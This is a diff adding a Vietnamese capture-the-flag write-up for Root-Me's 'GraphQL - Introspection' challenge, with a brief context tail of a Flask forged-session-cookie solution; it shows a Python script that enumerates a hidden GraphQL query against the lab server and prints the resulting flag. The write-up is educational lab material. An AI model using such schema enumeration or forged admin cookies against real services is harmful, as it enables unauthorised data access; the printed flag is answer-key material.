@@ -580,3 +580,77 @@ eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z7-yIw.8JQHLu-H3ABVht6lAIQzBQKTf
 Thay giá trị của cookie `session` thành chuỗi vừa tạo `eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z7-yIw.8JQHLu-H3ABVht6lAIQzBQKTf08`, chúng ta reload trang web để thấy flag:
 
 ![image](images/flask-unsecure-session/image-4.png)
+
+## GraphQL - Introspection
+
+> The schema you will follow
+>
+> Take your first steps in exploring a GraphQL schema with the introspection feature!\
+> Who knows, you might discover something...
+
+Vào thử thách, chúng ta có một trang web như sau:
+
+![image](images/graphql-introspection/image-1.png)
+
+Khi nhấn "Search", chúng ta có một POST request tới `/rocketql` để thực hiện truy vấn GraphQL API lấy về kết quả:
+
+![image](images/graphql-introspection/image-2.png)
+
+Chúng ta sẽ tạo câu truy vấn introspection để lấy thông tin về schema:
+
+![image](images/graphql-introspection/image-3.png)
+
+Lấy kết quả trả về và đưa lên [GraphQL Visualizer](https://nathanrandal.com/graphql-visualizer/) để quan sát dễ dàng hơn, chúng ta tập trung vào truy vấn `IAmNotHere` có thể lấy ra dữ liệu từ trường `very_long_value` theo đối số nguyên `very_long_id`:
+
+![image](images/graphql-introspection/image-4.png)
+
+Vậy, chúng ta có thể viết đoạn script Python bên dưới để thử các số ở `very_long_id`:
+
+```python
+import requests
+
+URL = "http://challenge01.root-me.org:59077/rocketql"
+
+def solve():
+    i = 1
+    while True:
+        try:
+            query = {"query":f"{{ IAmNotHere (very_long_id: {i}) {{ very_long_value }} }}"}
+            r = requests.post(url=URL, json=query)
+
+            print(f"[+] i = {i} -> {r.json()}")
+            i = i + 1
+
+            if "flag" in r.json()["data"]["IAmNotHere"][0]["very_long_value"]:
+                break
+        except:
+            pass
+
+
+if __name__ == "__main__":
+    solve()
+
+```
+
+Chạy đoạn script trên, chúng ta có thể lụm được flag:
+
+```text
+$ python3 solve.py
+[+] i = 1 -> {'data': {'IAmNotHere': [{'very_long_value': 'n'}]}}
+[+] i = 2 -> {'data': {'IAmNotHere': [{'very_long_value': 'o'}]}}
+[+] i = 3 -> {'data': {'IAmNotHere': [{'very_long_value': 't'}]}}
+[+] i = 4 -> {'data': {'IAmNotHere': [{'very_long_value': 'h'}]}}
+[+] i = 5 -> {'data': {'IAmNotHere': [{'very_long_value': 'i'}]}}
+[+] i = 6 -> {'data': {'IAmNotHere': [{'very_long_value': 'n'}]}}
+[+] i = 7 -> {'data': {'IAmNotHere': [{'very_long_value': 'g'}]}}
+[+] i = 8 -> {'data': {'IAmNotHere': [{'very_long_value': 'h'}]}}
+[+] i = 9 -> {'data': {'IAmNotHere': [{'very_long_value': 'e'}]}}
+[+] i = 10 -> {'data': {'IAmNotHere': [{'very_long_value': 'r'}]}}
+[+] i = 11 -> {'data': {'IAmNotHere': [{'very_long_value': 'e'}]}}
+[+] i = 12 -> {'data': {'IAmNotHere': [{'very_long_value': 'l'}]}}
+[+] i = 13 -> {'data': {'IAmNotHere': [{'very_long_value': 'o'}]}}
+[+] i = 14 -> {'data': {'IAmNotHere': [{'very_long_value': 'l'}]}}
+[+] i = 15 -> {'data': {'IAmNotHere': []}}
+[+] i = 16 -> {'data': {'IAmNotHere': []}}
+[+] i = 17 -> {'data': {'IAmNotHere': [{'very_long_value': 'Congratulations, you can use this flag: RM{1ntr0sp3ct1On_1s_us3ful}'}]}}
+```
